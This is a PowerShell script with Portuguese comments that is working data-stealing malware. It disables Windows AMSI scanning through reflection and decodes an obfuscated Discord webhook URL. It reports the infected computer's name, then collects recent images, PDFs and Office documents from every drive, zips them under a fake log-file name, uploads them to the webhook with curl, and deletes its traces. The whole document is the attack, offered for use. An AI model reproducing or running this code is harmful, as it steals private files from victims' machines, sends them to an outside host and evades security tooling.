# [Bypass AMSI Reforçado V16] - Procura a classe em memória sem citar o nome diretamente
$a = [Ref].Assembly.GetTypes(); foreach($t in $a){if($t.Name -like "*AmsiUtils*"){$m=$t}};
$m.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 1. Configurações e Protocolos
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wEnc = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NDM2MTE5NTQ0MzE5NjA2Ni9Hb1g5NjE5cmZuUzd6aGE4TUJaelhFZHNSZVNGb3NGWUZidEZ5VmZOUHZ4eWJKWHlYVnc3VGtMUG9qNU0tZzZuV2FYWA=="
$u = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($wEnc))

# Notificação de Sucesso na Execução
curl.exe -k -s -F "content=🟢 V16 (Indireção) Ativo em $env:COMPUTERNAME" $u

$tempDir = "$env:TEMP\sys_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

# 2. Busca e Filtragem (30 dias / <15MB)
$e = @('*.jpg', '*.pdf', '*.docx', '*.xlsx')
Get-PSDrive -PSProvider FileSystem | ForEach-Object {
    Get-ChildItem -Path $_.Root -Include $e -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
        $p = $_.FullName
        $skip = $false; foreach($d in @("C:\Windows", "C:\Program Files")) {if($p.StartsWith($d)){$skip=$true;break}}
        !$skip -and $_.LastWriteTime -gt (Get-Date).AddDays(-30) -and $_.Length -lt 15MB
    } | ForEach-Object { Copy-Item $_.FullName -Destination $tempDir -ErrorAction SilentlyContinue }
}

# 3. Compactação e Envio (ZIP Camuflado)
$zipFile = "$env:TEMP\win_log_$(Get-Date -Format 'HHmm').tmp"
if ((Get-ChildItem $tempDir).Count -gt 0) {
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFile -Force
    curl.exe -k -s -F "file=@$zipFile" $u
}

# Limpeza Total de Rastos
Remove-Item $tempDir -Recurse -Force; Remove-Item $zipFile -Force; exit
